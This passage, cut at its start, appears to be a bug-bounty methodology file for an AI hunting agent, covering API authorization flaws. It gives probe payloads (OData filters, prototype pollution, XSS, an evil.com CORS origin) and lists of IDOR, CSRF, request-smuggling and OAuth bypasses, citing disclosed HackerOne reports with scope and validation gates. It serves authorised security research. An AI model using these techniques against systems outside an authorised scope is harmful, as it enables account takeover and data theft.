Distinct errors such as `Invalid route` or `consult API definition` mean your value reached the router. Walk to the spec with traversal variants (`../openapi.json`, `../swagger.json`, `../v3/api-docs`) to learn valid resource and field names before targeting a sensitive field.

### OData operator / $batch probes (when `OData-Version` header is present)

```
GET /_api/data/contacts?$filter=startswith(secretField,'a')     # boolean oracle
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname  # column ACL bypass
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201            # encoded $
GET /api?%2524filter=...                                        # double-encoded $
GET /Users(1)/$value                                            # path-segment style

POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

Send the same predicate three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch`; divergent WAF behavior confirms a parser-discrepancy bypass.

### Prototype-pollution marker probes (object-update endpoints)

```
{"__proto__":{"polluted":"pp-1337"}}
{"constructor":{"prototype":{"polluted":"pp-1337"}}}
__proto__[polluted]=pp-1337
constructor[prototype][polluted]=pp-1337
# Then hit account/profile/admin/job/export/render and diff against baseline.
# Escalate only through learned sinks (json spaces / status / isAdmin / shell).
```

### Cookie / header manipulation probes

```
https://target/console/auth?consumer_key=x;%20domain=target.com;%20Max-Age=99999999999999999999
Origin: https://evil.com                    # ACAO reflection (#591302)
X-Forwarded-For: 127.0.0.1                   # rate-limit bypass (#727487)
Authorization: Basic <base64-from-captured-app-traffic>   # token reuse (#232650)
```

### Stored-payload probes in API fields

```
"image_url": "<img src=x onerror=alert(1)>"      # #219957 attachment field
"content": "<script>...</script>", "typesetAsMath": false   # #2846011 graphie label
<svg ... onload="alert('x')">...</svg>           # #2846011 malicious SVG upload
"title": "<img src=x onerror=...>"                # comment-injection surfaces
```

---

## Common Root Causes

1. **Client-supplied object identifiers trusted as authorization.** The dominant root cause. `user_id`, `application[id]`, `accounts=`, `campaignId`, and numeric path IDs are looked up without checking ownership (`#983070`, `#1644436`, `#1695454`, `#1061292`, `#1182465`).

2. **No server-side authorization on internal/admin/legacy endpoints.** Routes are hidden from the UI, not protected — "security by obscurity." Exposed Cortex (`#1258871`), Docker Registry (`#347296`), Kubernetes API (`#455645`), `fileCopy` GraphQL (`#981472`), and TAMS admin details (`#1061292`) all fall here.

3. **Secrets shipped to the client or committed to source.** API keys in JS bundles (`#983331`, `#2923061`, `#1066410`), APK resources (`#792850`, `#753868`), git history (`#1302395`, `#1992261`, `#352623`), and web archives (`#2380084`). A key is not a secret if it ships in the artifact.

4. **Missing rotation and over-broad scope.** Disclosed keys stay valid (`#1047125`), keys for one resource work on others (`#118925`), and HMAC signatures omit the endpoint/payload (`#3670955`).

5. **Default documentation and introspection left enabled.** Swagger/OpenAPI/NSwag and GraphQL introspection (`#2886723`) enumerate every endpoint, model field, and privileged attribute for the attacker.

6. **Over-permissive parameter binding / mass assignment.** The DTO accepts more fields than the UI sends; `role`/`isAdmin`/`verified` are silently applied (`#267781`, domain ref).

7. **Authorization applied per-method or per-route, not per-object.** CSRF token required on POST but not GET (`#1122408`); permissions differ between REST and GraphQL mutations (`#2216036`); webhook scoping ignores read permissions (`#227230`).

8. **Caching reflected headers.** `Access-Control-Allow-Origin` echoes `Origin` into a shared cache (`#591302`).

9. **No throttling on stateful endpoints.** Near-infinite loops (`#880187`), unbounded parallel requests (`#249319`), token regeneration (`#243619`), and spamming/email-bomb APIs (`#222080`, `#221948`).

10. **Weak redirect/URL structure validation.** Arbitrary `redirect_uri` with implicit grants (`#3955956`), regex-based shortener rules (`#1066410`), and server-side URL interpolation of user input (domain ref server-side parameter pollution).

11. **Parser/protocol discrepancies between layers.** HTTP request smuggling (`#771666`), mutation polyglots, and content-type sniffing (`#3455`) cause two components to disagree on where a request begins and ends.

12. **Excessive data in API responses.** Responses include fields the UI never displays — private emails in `activities` (`#196655`), mobile numbers (`#902733`), read receipts (`#1080437`), hashed passwords (`#2788557`), or internal paths and tokens.

### Root-cause → evidence map

| Root cause | Minimal proof | Representative IDs |
|---|---|---|
| Client-supplied object ID | Two accounts, swapped ID, victim's data in response | `#983070`, `#1644436`, `#1695454` |
| Missing auth on internal route | Unauthenticated curl returning sensitive body | `#1258871`, `#1061292`, `#347296` |
| Secret in client/repo | Working key validated against vendor API | `#983331`, `#1302395`, `#2923061` |
| Spec/introspection exposure | Schema listing hidden or privileged fields | `#2886723` |
| Mass assignment | Privileged field persisted after update | `#267781` |
| Per-method auth | GET/override bypasses the POST-only control | `#1122408`, `#2149124` |
| Cache + reflected header | Poisoned ACAO served to a second client | `#591302` |
| Missing throttling | Request counter vs server errors over N requests | `#880187`, `#243619` |
| Weak redirect validation | Attacker URI receives a victim-bound token | `#3955956`, `#1066410` |
| Parser disagreement | Smuggled request captured from another user | `#771666`, `#3455` |
| Over-broad response | Field present in JSON but absent in UI | `#196655`, `#902733`, `#1080437` |

Most reports in the corpus name the symptom ("information disclosure", "improper access control") rather than the root cause. Naming the root cause in your report — and showing the negative control that proves the correct sink — is what makes the finding actionable.

---

## Bypass Techniques

### Object-reference bypasses
```
# Sequential / enumerated IDs
user_id=1001 -> 1002 -> 1003            # #983070
pendingUserDetails/2634 -> /2635        # #1061292
wp-json/wp/v2/users/1 -> /192           # #1785021
accounts=<own> -> accounts=<victim>     # #1644436

# Nested / alternative field names
application[id]=<victim>                # Rails-style nested param #1695454
{"userId":...} / {"user_id":...} / {"owner":...} / {"account":...}
GUID/UUID vs numeric — try both forms against the same endpoint
```

### Error-driven field disclosure
```
Strip all params except ID + CSRF -> verbose "Name must be provided" error
prints the target object's page with Client ID / Client Secret (#1695454)
"Invalid route" / "consult API definition" -> enumerate spec via ../ traversal
GraphQL "undefined" parameter -> returns other users' address books (#473742)
```

### Verb / method bypasses
```
POST -> GET (GraphQL mutations skip X-CSRF-Token)     # #1122408
DELETE/POST -> GET (/v1/account/destroy)             # #2197244
X-HTTP-Method-Override: PUT / PATCH                  # #2149124
_method=GET / ?_method=GET                            # #384782
HEAD instead of GET for read endpoints
```

### Parameter-pollution / binding bypasses
```
Duplicate params: ?id=own&id=victim
JSON vs form encoding; array vs scalar: {"id":["own","victim"]}
Add undocumented fields to PATCH/PUT body (#267781)
Change Content-Type to application/x-www-form-urlencoded or text/plain to
skip CSRF while the server still parses the body (#419891, #44146)
```

### Auth-lifecycle bypasses
```
Reuse an API token after ban/deletion (#1577940, #2081930)
Revoked user still reads merge requests (#962604); removed user still writes (#1479894)
Add 2FA to a victim account by substituting their ID, then verify with a code (#810880)
Expired-password user retains API + Git access (#1285226)
```

### CORS / cache bypasses
```
Origin: https://evil.com  -> reflected ACAO + credentials (#591302)
Origin: null / subdomain regex / trusted sibling origin
Poison the shared cache, then victims receive the reflected header
```

### Key / scope bypasses
```
Key from a *disclosed report* still valid -> reuse it (#1047125)
Key restricted to one index works on all indices (#118925)
HMAC over method only, not endpoint+payload -> request forgery (#3670955)
Default credentials / unauthenticated management API (#347296, #187025)
```

### Redirect / OAuth bypasses
```
attacker-chosen redirect_uri with no ownership proof + implicit grant
-> victim-bound access_token in URL fragment (#3955956)
Shortener regex allows arbitrary domain -> open redirect (#1066410)
OAuth authorize POST without authenticity_token (#215381, #850022)
```

### Parser-level bypasses
```
HTTP request smuggling (CL.TE / TE.CL) against api.* front-ends (#771666)
CL.TE desync to steal another user's X-Access-Token in bulk
Mixed-case / encoded OData operators and /odata/$batch to hide sub-requests
from WAF signatures (domain ref)
```

### Identifier-format bypasses
```
numeric ID  -> padded/leading-zero variants: 02634 vs 2634
UUID        -> uppercase/lowercase, brace form, hyphenless form
string slug -> URL-encoded, double-encoded, unicode-normalized lookalikes
array form  -> {"user_id":["own","victim"]} where a scalar is expected
param alias -> id / user_id / userId / owner / account / subject
```

### Scope and tenancy bypasses
```
org_id / tenantId added to a token-regeneration or lookup request
Key restricted to one index used against a sibling index (#118925)
Webhook created for actions beyond the caller's read scope (#227230)
Low-priv staff changing an OAuth admin's POST parameters to gain full admin (#135989)
Partner/test account retained after the "delete account" option disappeared (#1394982)
```

### Cache and CDN bypasses
```
Vary: Origin absent -> reflected ACAO cached across origins (#591302)
Cache-buster query param to confirm a poisoned response is shared
X-Forwarded-Host / X-Forwarded-For to influence generated links or rate limits
Alias a taken-over subdomain as an allowed CORS origin (see hunt-subdomain)
```

### When a control seems solid
```
Re-test every sibling scope/path/role — #682442 fixed wiki_blobs but not blobs
Check legacy and versioned routes: /v0/, /legacy/, /internal/, /unstable/
Check the alternative representation (REST vs GraphQL vs batch) of the same action
Check post-auth vs pre-auth behavior; some endpoints only enforce auth on one path
```

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Show a response containing *another* user's data (email, mobile number, token, financial stat) or a successful state change on their object (`#196655`, `#902733`, `#1644436`, `#1695454`).
   - For an exposed endpoint, show the actual sensitive content returned unauthenticated — not just that the route responds (`#1258871`, `#1061292`, `#347296`).
   - For a leaked key, demonstrate one live, unauthorized action against the vendor API (`#1047125`, `#1785145`). A string in a JS file alone is informational.
   - For CSRF/verb issues, show the state change occurring with the victim's session and without the expected token (`#1122408`, `#419891`).

2. **What does the victim lose?**
   - Account takeover via token/2FA/reset-data theft (`#810880`, `#1342088`, `#1695454`)?
   - PII or financial disclosure at scale (`#902733`, `#1644436`, `#3078508`)?
   - Admin account creation or full management-API control (`#836081`, `#455645`, `#347296`)?
   - Quantify the blast radius: enumerate how many records/accounts are reachable, not just one.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Do you control two accounts with known IDs, and does the swap work deterministically?
   - Does the spec/introspection endpoint still enumerate the privileged field?
   - Can a second person follow the steps and get the same cross-account response?
   - If reproduction depends on a stale token, a cached response, or a race, stabilize it first.

**Server-policy-vs-state gate.** A permissive CORS header, an exposed Swagger UI, or a leaked-but-restricted key is a *policy* observation. It becomes a finding only when you demonstrate an actual sensitive read or unauthorized action. Conversely, a "critical" label on a public-but-dummy endpoint (`#307050`) should be right-sized to the real impact.

**Scope gate.** Several strong technical findings were reported against out-of-scope or third-party assets (`#187025` IDRAC on a subdomain, `#1065041` a vendor API key). Confirm the vulnerable asset is in scope and that the key/endpoint belongs to the program.

### Common false positives to reject before submission

- **URL echoed in an error string.** The server formatting your input into a message is not an outbound request. Require an OOB callback for SSRF claims.
- **Different status code for two URLs.** Can come from a scheme validator, not a fetch. Correlate with a callback or a recognisable upstream body.
- **A 200 response to `__proto__` or an extra JSON field.** Not proof of pollution or mass assignment. Show the value reaching a later sink or changing a privileged state.
- **Public/publishable keys in client bundles.** Stripe publishable keys and browser Google Maps keys are designed to be public; demonstrate billing impact, write scope, or access to a non-public resource.
- **Swagger UI / introspection "findings."** Often intended; check the program policy. Pair with a concrete hidden endpoint or privileged field before reporting.
- **Fuzzing noise from errors.** Generic `500`, stack traces without data, or WAF blocks are not impact. Translate them into a data read, state change, or measurable availability loss.
- **A fix that only changed the error message.** `#682442` illustrates the opposite risk — one scope was patched while a sibling remained vulnerable. Re-test the whole family.

---

## Real Impact Examples

### Scenario A: Object IDOR → API token → full account takeover (Automattic/Pressable pattern, `#1695454`)
The researcher created an API application on `my.pressable.com/api/applications` and observed an `application[id]` parameter in the update request. Changing it to a second account's app ID moved that application into the attacker's account — a low-impact IDOR on its own. Escalation came from stripping all parameters except `application[id]` and `authenticity_token`: the endpoint returned a "Name must be provided" error that printed the victim application's page, including its **Client ID and Client Secret**. With those credentials the attacker could act on the victim's account through the documented API — converting an object-reference bug into account takeover. The same escalation pattern appears in Helium's 2FA linking (`#810880`), where substituting a victim's ID let the attacker bind a 2FA device and then log in with only the ID plus a valid code.

### Scenario B: Exposed management API → RCE / credential theft (Kubernetes + Semmle pattern, `#455645`, `#347296`)
An exposed Kubernetes API (TOP list, ~1,184 upvotes, $25,000) gave RCE and exposed credentials. Separately, while investigating a sandboxed build container, the researcher found port 5000 open on the host — a Docker Registry HTTP API v2 with no authentication. The researcher dumped the `lgtm/top` repository, then used an `.lgtm.yml` build hook plus an SSH reverse tunnel to reach the registry and demonstrate image dumping and poisoning. The lesson: internal-only management APIs left bound to reachable interfaces are not "informational" — they are direct RCE and supply-chain primitives.

### Scenario C: Bulk token theft via HTTP request smuggling (Zomato pattern, `#771666`)
On `api.zomato.com`, an HTTP request smuggling desync between front-end and back-end let the researcher capture other users' requests in bulk, including the `X-Access-Token` header (CVSS 9.8). This is the highest-severity API finding in the corpus because it turns a single crafted request into harvested credentials for many victims. The same "parser disagreement" class shows up in content-type sniffing on `api.slack.com` (`#3455`) and mutation-polyglot payloads against Shopify's admin SDK (`#883867`).

### Scenario D: Blind SSRF through a preview/export endpoint (Reddit + GSA pattern, `#1960765`, `#895696`)
Reddit's `_matrix/media/r0/preview_url` API fetched attacker-supplied URLs server-side; varying internal IPs and ports leaked service names through response differences (blind SSRF, $6,000). On `labs.data.gov`, improper route handling let the researcher call a controller function directly — `Campaign/json_status/gopher%3A%2F%2F127.0.0.1/` produced a blind SSRF via the gopher protocol. In both cases the finding required OOB confirmation and careful parameter attribution, because the server did not return the fetched body.

### Scenario E: CORS + cache poisoning as a forced DoS (Automattic WP-JSON, `#591302`)
The WP-JSON implementation echoed an arbitrary `Origin` header into `Access-Control-Allow-Origin`, and that response was cached and served to other users. A victim site whose frontend consumed the WP-JSON API would receive a response carrying the attacker's origin, breaking cross-origin reads for legitimate origins — a denial of service through a cache layer (405 upvotes). This illustrates that a "misconfiguration" need not leak data directly to be impactful.

### Scenario F: Mass-harvest via anonymous object enumeration (WordPress / TAMS pattern, `#197786`, `#1061292`, `#1785021`)
WordPress sites commonly expose `/wp-json/wp/v2/users/` with `show_in_rest => true`, listing every published author — usually including the admin account (`#197786`). Incrementing the ID (`/users/1`, `/users/192`) reveals individual records (`#1785021`). The same pattern at higher sensitivity: `tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/{REGISTRATION_ID}` returned names, addresses, phone numbers, attachment IDs, corporate info, and roles — with no JWT — and attachments were readable via a parallel numeric endpoint (`#1061292`). The common failure is treating a numeric path segment as an internal implementation detail rather than an authorization boundary.

### Scenario G: Cognito token reuse and 2FA-linking ATO (Flickr + Helium pattern, `#1342088`, `#810880`)
On Flickr, the login flow through `identity.flickr.com` issued an Amazon Cognito `access_token` that was accepted directly by the AWS API (`aws cognito-idp get-user --access-token ...`) — an authentication token minted for one context became a credential for another (`#1342088`). In Helium, the researcher linked 2FA to a victim account by substituting the victim's ID on `/api/2fa`, then logged in with only the ID and a valid code at `/api/2fa/verify`, bypassing password knowledge entirely (`#810880`). Both cases show that API endpoints handling authentication material must bind the token/ID to an authenticated session, not trust the identifier in the request body.

### Scenario H: Leaked key chaining into paid-service abuse (FetLife + Clario pattern, `#1065041`, `#1066410`, `#2380084`)
A Google API key leaked across multiple FetLife subdomains was usable against the Geocode API, with a documented cost of roughly $5 per 1,000 requests — direct financial damage plus DoS potential (`#1065041`). On Clario, a Firebase key found in `main.*.js` unlocked a URL-shortening endpoint whose weak regex allowed arbitrary redirect targets (`#1066410`). In both, the key was discovered through passive recon and the impact was demonstrated against the real vendor API — the pattern to reproduce whenever a secret turns up in a bundle, repo, or archive (`#2380084`, `#2923061`).

---

## Disclosed Report Citations (30 verified — every ID real in the study pack or TOPAPI.md)

1. **Snapchat — Exposed Kubernetes API - RCE/Exposed Creds** ([H1 #455645](https://hackerone.com/reports/455645)) — misconfiguration / exposed management API, admin-internal, bounty $25,000.
2. **Uber — API access to Phabricator on code.uberinternal.com from leaked certificate in git repo** ([H1 #591813](https://hackerone.com/reports/591813)) — leaked credential, public-code-search, bounty $39,999.
3. **Flickr — Flickr Account Takeover using AWS Cognito API** ([H1 #1342088](https://hackerone.com/reports/1342088)) — account takeover / improper authentication, sso-oauth + cloud-metadata, 2021.
4. **Eternal — Stealing Zomato X-Access-Token in Bulk using HTTP Request Smuggling on api.zomato.com** ([H1 #771666](https://hackerone.com/reports/771666)) — request smuggling, mutation-polyglot + blind-oob, 2020, CVSS 9.8.
5. **Automattic — Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** ([H1 #591302](https://hackerone.com/reports/591302)) — CORS/cache poisoning, cors-misconfig + cache-layer, 2019.
6. **Shopify — Undocumented `fileCopy` GraphQL API** ([H1 #981472](https://hackerone.com/reports/981472)) — broken access control, graphql + admin-internal, $2,000, 2020.
7. **GitLab — Git flag injection - Search API with scope 'blobs'** ([H1 #682442](https://hackerone.com/reports/682442)) — command injection, public-code-search + search-filter-sort, $7,000, 2019.
8. **Aiven Ltd — Apache Flink RCE via GET jar/plan API Endpoint** ([H1 #1418891](https://hackerone.com/reports/1418891)) — unauthenticated RCE, url-fetching + server-side-rendering, $6,000, 2021.
9. **Khan Academy — CSRF vulnerability on API endpoint allows account takeovers** ([H1 #419891](https://hackerone.com/reports/419891)) — CSRF → ATO, sso-oauth + csrf, 2018.
10. **Shopify — Exposed Cortex API at cortex-ingest.shopifycloud.com** ([H1 #1258871](https://hackerone.com/reports/1258871)) — misconfiguration / info disclosure, debug-error-leak + dos-resource, $6,300, 2021.
11. **Helium — Account takeover w/o interaction via 2FA linking and improper auth at /api/2fa/verify** ([H1 #810880](https://hackerone.com/reports/810880)) — improper authentication → ATO, cookie-handling, $100, 2020.
12. **X / xAI — Able to see Twitter Circle tweets due to improper access control on the "FavoriteTweet" endpoint** ([H1 #1694304](https://hackerone.com/reports/1694304)) — broken access control, js-source-review + proxy-feature, 2022.
13. **GitLab — CSRF on /api/graphql allows executing mutations through GET requests** ([H1 #1122408](https://hackerone.com/reports/1122408)) — CSRF, graphql + csrf, $3,370, 2021.
14. **Slack — SSRF in api.slack.com, using slash commands and bypassing the protections** ([H1 #381129](https://hackerone.com/reports/381129)) — SSRF, filter-bypass, 2018.
15. **Semmle — Docker Registry HTTP API v2 exposed in HTTP without authentication** ([H1 #347296](https://hackerone.com/reports/347296)) — broken access control / misconfiguration, public-code-search + internal-network, 2018.
16. **Curve — Sensitive Info Leak: retrieving all users' mobile numbers at website-api.production.curve.app/api/waitlist/us** ([H1 #902733](https://hackerone.com/reports/902733)) — information disclosure, js-source-review + json-body, 2020.
17. **HackerOne — Near to Infinite loop when changing Group's name that has API token as Team Member** ([H1 #880187](https://hackerone.com/reports/880187)) — resource exhaustion / DoS, dos-resource + admin-internal, $2,500, 2020.
18. **Bumble — Bumble API exposes read status of chat messages** ([H1 #1080437](https://hackerone.com/reports/1080437)) — information disclosure, proxy-feature + boolean-based, $600, 2021.
19. **Rocket.Chat — XSS via /api/v1/chat.postMessage** ([H1 #219957](https://hackerone.com/reports/219957)) — stored XSS, server-side-rendering + search-filter-sort, 2017, CVSS 9.9.
20. **Clario — Google API key leaks and security misconfiguration leads Open Redirect Vulnerability** ([H1 #1066410](https://hackerone.com/reports/1066410)) — open redirect / key leak, js-source-review + redirect-handling, $300, 2020.
21. **GSA Bounty — Blind SSRF on labs.data.gov/dashboard/Campaign/json_status/ Endpoint** ([H1 #895696](https://hackerone.com/reports/895696)) — blind SSRF via route handling, blind-oob + public-code-search, $300, 2020.
22. **1Password — API Key Exposed in JavaScript File on 1Password Developer Site** ([H1 #2923061](https://hackerone.com/reports/2923061)) — key disclosure, js-source-review, 2025.
23. **Automattic — IDOR in API applications (able to see any API token, leads to account takeover)** ([H1 #1695454](https://hackerone.com/reports/1695454)) — IDOR → ATO, search-filter-sort + idor-object-ref, 2022.
24. **Reddit — Blind SSRF to internal services in matrix preview_link API** ([H1 #1960765](https://hackerone.com/reports/1960765)) — blind SSRF, link-preview + blind-oob, bounty $6,000.
25. **New Relic — Users can enable API access for free via mass assignment** ([H1 #267781](https://hackerone.com/reports/267781)) — mass assignment, json-body, bounty $0.
26. **Shopify — GraphQL Introspection Enabled on Shopify API Endpoint** ([H1 #2886723](https://hackerone.com/reports/2886723)) — information disclosure / misconfiguration, graphql + proxy-feature, 2020.
27. **HackerOne — DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API** ([H1 #3287208](https://hackerone.com/reports/3287208)) — resource exhaustion, graphql + dos-resource, bounty $12,500.
28. **Frontegg — PATCH method manipulation allowing users to escalate functionalities and edit API Keys settings** ([H1 #2149124](https://hackerone.com/reports/2149124)) — HTTP verb tampering, misconfiguration, bounty $0.
29. **Lichess — Server-Side Request Forgery (SSRF) via Game Export API** ([H1 #3165242](https://hackerone.com/reports/3165242)) — SSRF, export-feature + url-fetching, bounty $0.
30. **Stripo Inc — Public and secret api key leaked in JavaScript source** ([H1 #983331](https://hackerone.com/reports/983331)) — key disclosure, js-source-review + fuzzing-enumeration, 2020.

---

## Related Skills & Chains

- **`hunt-ssrf`** — For URL-accepting API parameters (preview, export, batch, webhook) that make the server fetch internal resources. Chain primitive: API `url` parameter + `hunt-ssrf` → OOB-confirmed SSRF → cloud metadata / internal admin API. Owns the OOB-OR-IT-DIDN'T-HAPPEN gate.
- **`hunt-ato`** — IDOR over API tokens, 2FA linking, and reset data are direct takeover paths. Chain primitive: object-reference IDOR (`#1695454`) + `hunt-ato` → Client Secret / reset token → login as victim (`#810880`, `#1342088`).
- **`hunt-auth-bypass`** — JWT/crypto handling (`alg:none`, key confusion, `kid`/`jku`) is owned there; this skill covers the non-crypto API authorization layer (roles, object ownership, method checks). Chain primitive: mass-assigned `role=admin` + auth-bypass → privileged API calls.
- **`hunt-cors`** — Reflect-any-origin, null-origin, and subdomain-regex bypasses. This skill covers the cache-poisoning amplification (`#591302`); hand deep CORS origin-bypass work to `hunt-cors`.
- **`hunt-jwt-crypto`** — Token forgery and signature confusion for API auth tokens; invoke when the API's bearer token is a JWT you can manipulate.
- **`hunt-cloud-misconfig`** — Exposed Kubernetes/Cortex/Docker management APIs (`#455645`, `#1258871`, `#347296`) and IMDS reachability. Chain primitive: exposed API → cloud credentials → `cloud-iam-deep` escalation.
- **`hunt-subdomain`** — Dangling DNS and CNAME takeovers (`#746000`) plus API subdomains discovered via `api.*` enumeration; a taken-over trusted subdomain defeats origin allowlists.
- **`hunt-rce`** — Exposed management APIs (Flink `#1418891`, Docker Registry `#347296`) frequently end in code execution; chain the access-control finding to `hunt-rce` for impact proof.
- **`web2-recon`** — Spec/introspection path enumeration, subdomain discovery, and JS bundle collection feed directly into this skill's Discovery Patterns.
- **`security-arsenal`** — Load the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenantId`), the API-key grep patterns, and the SSRF IP-bypass table before testing filters.
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: demonstrate an actual cross-account read or unauthorized action before reporting a permissive header, exposed spec, or leaked-but-restricted key.


---

## Merged Source Knowledge

This section consolidates **179 unique knowledge blocks** from 12 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (196 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/references/attack-vectors/web-api-vectors.md`

## Authentication
- JWT `alg:none`, weak secret, expired token acceptance
- OAuth: state CSRF, redirect_uri manipulation, token leakage in referrer
- Password reset: host header injection in reset link, predictable token, no expiry, concurrent reuse
- Session fixation, session riding, session not invalidated on logout
- Email confirmation bypass: confirmation sent to old email instead of new email → account takeover via SSO
- Session cookie theft via HTTP request smuggling (CL.TE desync → redirect → cookie exfil)

## Authorization
- IDOR: horizontal (peer resources), vertical (admin resources)
- Mass assignment: undocumented fields (`role`, `is_admin`, `balance`)
- Function-level auth: middleware checks but handler does not
- GraphQL: missing auth on mutations, IDOR in node IDs, batch query abuse
- Tenant isolation failures in multi-tenant SaaS
- Email confirmation bypass → SSO takeover → full privilege escalation

## Injection
- SQLi: error-based, time-based, UNION, blind
- CSV injection: leading `=`, `+`, `-`, `@` in exported spreadsheet fields
- SSTI: Jinja2, Twig, FreeMarker, Velocity
- SpEL Injection: Spring Expression Language — `${7*7}` in error pages, `${T(java.lang.Runtime)}` for RCE, Akamai WAF bypass via character-by-character ASCII construction without quotes
- Command injection: `;`, `|`, `$()`
- XXE: SYSTEM entity, OOB via external DTD
- SSRF: cloud metadata, internal network, localhost
- Path traversal: `../`, `....//`, upload/download file path abuse
- Open redirect: unvalidated `next`, `return_url`, `redirect_uri` parameters
- Parameter pollution: duplicate query/form params, array/scalar collisions, header/value mismatches
- OS command injection via web application parameters (IP fields, lookup tools)

## Cross-Site
- XSS: reflected, stored, DOM; SVG upload, Markdown renderer
- XSS WAF Bypass: Unicode escapes (\u0061), HTML entities (&#106), optional chaining (?.), comment splitting (/**/), string concatenation ('ale'+'rt'), AutoFocus+OnFocus chaining, regex source (/al/.source+/ert/.source), dynamic import() exfil, form feed (%0C) + tab (%09) whitespace, multi-element assembly via location=, contenteditable+onbeforeinput, array indexing chars, double URL encoding (%252F)
- Blind XSS: fetch('/admin') → btoa() → new Image().src exfiltration chain for admin page content theft
- CSRF: missing token, SameSite not set
- CORS: wildcard with credentials, null origin accepted
- Host header injection: reset link, cache poisoning
- Blind XSS on image upload (admin panel rendering)
- Stored XSS via cache poisoning on authentication pages
- XSS in game client / chat interface leading to RCE

## Business Logic
- Negative/zero quantities
- Coupon stacking
- Workflow step skip
- Rate limit bypass via headers
- Email confirmation bypass → set master password for all accounts
- Payment in-flight data modification
- CD key / license key extraction via API manipulation

## Advanced
- HTTP request smuggling: CL.TE, TE.CL → session hijack → mass account takeover
- Cache poisoning: X-Forwarded-Host, X-Original-URL → stored XSS on sensitive pages
- Subdomain takeover: CNAME to unclaimed cloud asset → authentication bypass
- WebSocket: missing auth on upgrade, CSWSH
- Deserialization: Java, PHP, Python pickle, PHP object injection in cookies
- Supply chain: npm/Gem/PyPI package name squatting → RCE on install
- Git flag injection: malicious filenames in repo import → file overwrite → RCE
- Project import: path traversal in file copy operations → arbitrary file read

## Infrastructure Misconfiguration
- Exposed CI/CD: Jenkins, CircleCI, GitLab CI without authentication
- Exposed monitoring: Grafana dashboards with internal metrics and credentials
- Exposed Kubernetes API: no auth → full cluster access → container RCE
- Exposed Spring Actuators: /actuator/env leaks secrets, /actuator/heapdump for memory analysis
- Exposed admin panels: Jira, Confluence, Phabricator from leaked certificates

## Credential & Secret Exposure
- GitHub tokens in compiled apps (.env in Electron .asar files)
- API keys in JavaScript bundles
- Tokens in CI/CD build logs (Travis CI, GitHub Actions)
- Docker Hub tokens in environment variables
- Hardcoded credentials in public repositories
- Leaked certificates granting access to internal services

## Information Disclosure
- Stack traces, DB errors
- API keys in JS bundles / git history
- GraphQL introspection on production — mass PII exfil via missing field-level auth
- Backup files: `.bak`, `.old`, `.swp`, `.git/`
- JWT claims with internal data
- Memory content disclosure in webmail clients


### From `hunt-skills/bountyforge/references/bug-bounty-intelligence-mcp.md`

# Bug Bounty Intelligence MCP — Integration Guide

MCP server for AI-powered smart contract security analysis. Trained on 27,681 Sherlock/Code4rena findings. [GitHub](https://github.com/holistis/bug-bounty-intelligence-mcp) | npm: `bug-bounty-intelligence-mcp@latest`

### `scan_contract` — Paid ($5 USDC on Base via x402)

Submits a public GitHub repo for AI-powered security analysis using the Al-Mizaan v3 7-gate framework.

```
Parameters:
  repo_url (required): Public GitHub repo URL (Solidity)
  protocol_type (optional): DEX | LENDING | BRIDGE | GOVERNANCE | STAKING | GENERAL

Returns: job_id for polling status
Cost: $5 USDC on Base (eip155:8453)
Delivery: Within 24 hours
```

### `get_scan_report` — Free

Polls the status of a submitted scan and returns the report URL when complete.

```
Parameters:
  job_id (required): The job ID from scan_contract

Returns: queued | processing | complete + report_url
```

### `list_vulnerability_patterns` — Free

Returns acceptance-rate percentages from exactly-reconciled Sherlock contests. No payment, no API key required.

```
Parameters:
  protocol_type (optional): DEX | LENDING | BRIDGE | GOVERNANCE | STAKING | GENERAL

Returns: Per-pattern acceptance rates with example findings
```

## Setup — Claude Code MCP Configuration

Add to `~/.claude/settings.json` or Claude Desktop config:

```json
{
  "mcpServers": {
    "bug-bounty-intelligence": {
      "command": "npx",
      "args": ["-y", "bug-bounty-intelligence-mcp@latest"]
    }
  }
}
```

Or via Claude Code CLI:

```bash
claude mcp add bug-bounty-intelligence -- npx -y bug-bounty-intelligence-mcp@latest
```

After setup, the tools `scan_contract`, `get_scan_report`, and `list_vulnerability_patterns` become available to BountyForge.

## When to Use Each Tool

| Scenario | Tool | Cost |
|----------|------|------|
| Pre-hunt prioritization — which bug classes pay? | `list_vulnerability_patterns` | Free |
| Auditing an unfamiliar protocol — what patterns matter? | `list_vulnerability_patterns` | Free |
| Full automated scan of a public Solidity repo | `scan_contract` | $5 USDC |
| Checking scan results | `get_scan_report` | Free |
| Cross-referencing BountyForge findings against acceptance data | `list_vulnerability_patterns` | Free |

### Pre-Hunt (with --learn or --solidity)

Before spawning agents, check acceptance rates for the protocol type:

```
Call list_vulnerability_patterns(protocol_type="LENDING")
→ Returns: oracle-manipulation 36% (131 cases), staleness 49% (174 cases), ...
→ Prioritize agents for high-acceptance, high-n patterns
→ Skip or deprioritize low-acceptance patterns (liquidation 29%, n=14)
```

### During Smart Contract Audit

Optionally submit for automated scanning:

```
Call scan_contract(repo_url="https://github.com/org/repo", protocol_type="LENDING")
→ Returns job_id
→ Poll get_scan_report(job_id) until complete
→ Cross-reference BountyForge findings with scan results
```

### Post-Hunt Validation

Use acceptance rates to calibrate confidence scores:

| Acceptance Rate | Confidence Adjustment |
|----------------|----------------------|
| > 60% | +10 confidence (well-established pattern) |
| 40-60% | No adjustment (moderate signal) |
| < 40% | -10 confidence (low historical acceptance, require stronger PoC) |
| n < 20 | Flag as low-sample (directional only, don't adjust) |

## Vulnerability Acceptance Rates (CC0 — Embedded)

Data from 1,032 exactly-reconciled findings across 10 Sherlock contests. Source: `vulnerability-acceptance-rates.json` (CC0 licensed).

